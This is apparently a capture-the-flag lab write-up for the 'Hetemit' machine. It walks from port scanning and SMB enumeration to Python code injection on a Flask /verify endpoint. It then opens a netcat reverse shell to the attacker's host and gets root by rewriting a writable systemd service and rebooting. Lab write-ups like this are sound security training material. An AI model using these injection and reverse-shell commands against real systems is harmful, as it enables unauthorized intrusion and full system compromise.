---
icon: ubuntu
---

# Hetemit - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
nmap -A -T4 -p- -Pn 192.168.118.117 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 15:59 EDT
Nmap scan report for 192.168.118.117
Host is up (0.029s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.158
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
|_  256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
80/tcp    open  http        Apache httpd 2.4.37 ((centos))
|_http-server-header: Apache/2.4.37 (centos)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
18000/tcp open  biimenu?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

### <mark style="color:$primary;">SMB Anonymous Login</mark>

```
netexec smb 192.168.118.117 -u '' -p '' --shares 
```

<figure><img src="../../.gitbook/assets/image (1278).png" alt=""><figcaption></figcaption></figure>

We found a couple of interesting shares, but we don't have any permissions on them. Also FTP anonymous login is allowed but there is nothing there either, so I will shift my focus to another port.

### <mark style="color:$primary;">HTTP Port 50000</mark>

<figure><img src="../../.gitbook/assets/image (1279).png" alt=""><figcaption></figcaption></figure>

As soon as we visit port 50000 we see something that looks like 2 endpoints. I am going to switch to curl for further investigation

<figure><img src="../../.gitbook/assets/image (1280).png" alt=""><figcaption></figcaption></figure>

The verify endpoint mentions something about code! This is starting to look like OS command injection to me! Let's play around with it.

```
curl -X POST http://192.168.118.117:50000/verify --data 'code=2*2'
```

<figure><img src="../../.gitbook/assets/image (1281).png" alt=""><figcaption></figcaption></figure>

based on the response I got it looks like the app performs evaluation!

I am going to try to get a reverse shell

### <mark style="color:$primary;">OS Command Injection (Python)</mark>

<figure><img src="../../.gitbook/assets/image (1282).png" alt=""><figcaption></figcaption></figure>

all of the python reverse shell from [https://www.revshells.com/](https://www.revshells.com/) import the **`os`** library and use it to interact with the system. I am going to do the same!

```
curl -X POST http://192.168.118.117:50000/verify --data 'code=os.system("whoami")'
```

<figure><img src="../../.gitbook/assets/image (1284).png" alt=""><figcaption></figcaption></figure>

When **`os.system`** in Python returns 0. It means that the executed command completed successfully without any errors! That's great I am going to try and get a reverse shell now!

```
curl -i -X POST --data 'code=os.system("nc 192.168.45.158 80 -e /bin/bash")' http://192.168.118.117:50000/verify
```

<figure><img src="../../.gitbook/assets/image (1286).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (1287).png" alt=""><figcaption></figcaption></figure>

cmeeks can reboot the system, this makes me think that our privilege escalation phase might have something to do with that. Maybe there is a service we have write on that we can modify. I am gonna run linpeas and check the output

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (1288).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1289).png" alt=""><figcaption></figcaption></figure>

Linpeas screams that we have write access on pythonapp.service, I am going to check it out!

<figure><img src="../../.gitbook/assets/image (1290).png" alt=""><figcaption></figcaption></figure>

This is great! We can modify the user to be root in the script and instead of the service file starting a flask server I am going to have it connect to my attack machine via a nc reverse shell after reboot!

<mark style="color:red;">**Note that your shell will die when rebooting!**</mark>

I am going to use [**penelope**](https://github.com/brightio/penelope) to get a better reverse shell, and modify the script.

<figure><img src="../../.gitbook/assets/image (1291).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Misconfigured python service script</mark>

Below you can see the modifications I have done to the script. I have modified the execstart funciton, the user and the restartsec.

<figure><img src="../../.gitbook/assets/image (1292).png" alt=""><figcaption></figcaption></figure>

Now all that is left to do is make sure you have a listener ready on your desired port and restart the machine.

```
sudo /sbin/reboot
```

<figure><img src="../../.gitbook/assets/image (1293).png" alt=""><figcaption></figcaption></figure>

And we got a shell as root!
